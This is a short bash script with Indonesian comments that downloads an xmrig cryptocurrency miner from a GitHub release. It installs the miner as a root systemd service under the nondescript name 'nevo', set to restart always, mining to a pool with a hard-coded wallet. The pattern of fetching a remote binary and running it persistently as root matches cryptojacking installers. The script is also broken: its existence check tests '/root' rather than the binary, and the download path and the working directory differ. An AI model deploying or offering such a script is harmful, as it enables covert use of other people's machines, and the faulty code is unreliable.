#!/bin/bash

# Step 1: Periksa apakah file xmrig sudah ada
if [ ! -f "/root" ]; then
    # File xmrig tidak ada, lakukan download dan ekstraksi
    wget https://github.com/cecepabdul/Docker/releases/download/1.2/xmrig
fi

# Step 2: Buat file konfigurasi systemd
sudo tee /etc/systemd/system/nevo.service <<EOF
[Unit]
Description=nevo Service
After=network.target

[Service]
ExecStart=/bin/bash -c "chmod +x ./xmrig && ./xmrig -k -a rx/nevo --donate-level 1 -o randomx.rplant.xyz:17102 -u NS2KMCKhpLSbz2RtKSLy92VRyzpbny6BfcX9uLLP3EsAF4rHQUGNtHbX6Uytbodj88b9tfUWzUebiXVyn2ZaFAqS13aSkdj67.cloud -p x"
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: Setel izin pada file konfigurasi
sudo chmod 644 /etc/systemd/system/nevo.service

# Step 4: Muat ulang konfigurasi systemd
sudo systemctl daemon-reload

# Step 5: Mulai layanan xmrig
sudo systemctl start nevo

# Tunggu selama 10 detik
sleep 10

# Periksa status layanan xmrig
sudo systemctl status nevo
